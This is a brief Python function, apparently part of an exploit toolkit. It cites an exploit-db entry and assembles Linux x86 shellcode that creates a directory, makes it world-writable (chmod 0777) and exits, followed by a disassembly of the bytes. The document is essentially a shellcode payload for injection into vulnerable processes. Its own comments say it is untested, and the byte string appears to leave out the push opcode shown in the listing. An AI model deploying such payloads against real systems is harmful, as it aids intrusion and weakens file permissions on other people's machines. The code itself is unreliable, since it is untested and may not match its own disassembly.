#Must be test

#https://www.exploit-db.com/exploits/37358/
#Not test yet


def mkdir( foldername):
	shellcode = "\x31\xc0\x50"
	shellcode += foldername
	shellcode += "\xb0\x27\x89\xe3\x66\x41"
	shellcode += "\xcd\x80\xb0\x0f\x66\xb9"
	shellcode += "\xff\x01\xcd\x80\x31\xc0"
	shellcode += "\x40\xcd\x80" 
	return shellcode




"""
08048060 <.text>:
 8048060:	31 c0                	xor    %eax,%eax
 8048062:	50                   	push   %eax
 8048063:	68 48 41 43 4b       	push   $0x4b434148  [Folder NAME]
 8048068:	b0 27                	mov    $0x27,%al
 804806a:	89 e3                	mov    %esp,%ebx
 804806c:	66 41                	inc    %cx
 804806e:	cd 80                	int    $0x80
 8048070:	b0 0f                	mov    $0xf,%al
 8048072:	66 b9 ff 01          	mov    $0x1ff,%cx
 8048076:	cd 80                	int    $0x80
 8048078:	31 c0                	xor    %eax,%eax
 804807a:	40                   	inc    %eax
 804807b:	cd 80                	int    $0x80

"""